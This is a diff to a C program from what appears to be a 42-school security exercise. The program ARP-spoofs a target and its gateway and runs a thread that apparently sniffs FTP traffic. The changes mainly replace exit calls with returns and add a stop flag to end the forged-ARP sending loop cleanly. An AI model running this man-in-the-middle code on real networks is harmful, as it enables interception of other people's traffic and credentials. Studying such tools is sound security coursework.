@@ -6,7 +6,7 @@
 /*   By: irifarac <marvin@42.fr>                    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/11/22 11:57:46 by irifarac          #+#    #+#             */
-/*   Updated: 2024/11/23 17:47:16 by israel           ###   ########.fr       */
+/*   Updated: 2024/11/24 23:00:10 by israel           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -28,12 +28,12 @@ static const char	*get_default_interface(void)
 	if (pcap_findalldevs(&interfaces, errbuf) < 0)
 	{
 		fprintf(stderr, "pcap_findalldevs: %s\n", errbuf);
-		exit(1);
+		return (NULL);
 	}
 	if (interfaces == NULL)
 	{
 		fprintf(stderr, "No interfaces found\n");
-		exit(1);
+		return (NULL);
 	}
 	printf("default interface is %s\n", interfaces->name);
 	return (interfaces->name);
@@ -53,14 +53,14 @@ static void set_arp_spoof(t_info info)
 	if (sock < 0)
 	{
 		perror("socket");
-		exit(1);
+		return ;
 	}
 	if (sscanf(info.mac_src, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
 		&source_mac[0], &source_mac[1], &source_mac[2],
 		&source_mac[3], &source_mac[4], &source_mac[5]) != 6)
 	{
 		fprintf(stderr, "Invalid MAC address\n");
-		exit(1);
+		return ;
 	}
 	memset(&device, 0, sizeof(device));
 	device.sll_family = AF_PACKET;
@@ -68,28 +68,38 @@ static void set_arp_spoof(t_info info)
 	if (device.sll_ifindex == 0)
 	{
 		perror("if_nametoindex");
-		exit(1);
+		return ;
 	}
 	device.sll_halen = ETH_ALEN;
-	while(1)
+	while(!stop)
 	{
 		set_hdrs(eth, arp, source_mac, info.ip_target);
 		printf("sending arp reply to %s\n", info.ip_target);
+		if (stop)
+			break ;
 		if (sendto(sock, buffer, 42, 0, (struct sockaddr *)&device, sizeof(device)) < 0)
 		{
-			perror("sendto");
-			exit(1);
+			if (stop)
+				break ;
+			perror("ERROR: sendto()");
+			break ;
 		}
 		spoof_gateway(eth, arp, source_mac, info.ip_target);
 		printf("Gateway is spoofed\n");
+		if (stop)
+			break ;
 		if (sendto(sock, buffer, 42, 0, (struct sockaddr *)&device, sizeof(device)) < 0)
 		{
+			if (stop)
+				break ;
 			perror("sendto()");
-			exit (1);
+			break ;
 		}
-		sleep(1);
+		sleep(2);
 	}
+	printf("Exiting ARP spoofing\n");
 	close(sock);
+	sock = -1;
 }
 
 int	main(int argc, char **argv)
@@ -130,7 +140,11 @@ int	main(int argc, char **argv)
 	signal(SIGINT, sigint_handler);
 	signal(SIGTERM, sigint_handler);
 	if (info.dev == NULL)
+	{
 			info.dev = get_default_interface();
+		if (info.dev == NULL)
+			return (1);
+	}
 	if (pthread_create(&sniffer_thread, NULL, sniff_ftp, (void *)&info) != 0)
 	{
 		perror("Failed to create sniffer thread");
@@ -138,6 +152,7 @@ int	main(int argc, char **argv)
 	}
 	printf("dev is %s\n", info.dev);
 	set_arp_spoof(info);
+	stop = 1;
 	pthread_join(sniffer_thread, NULL);
 	return (0);
 }
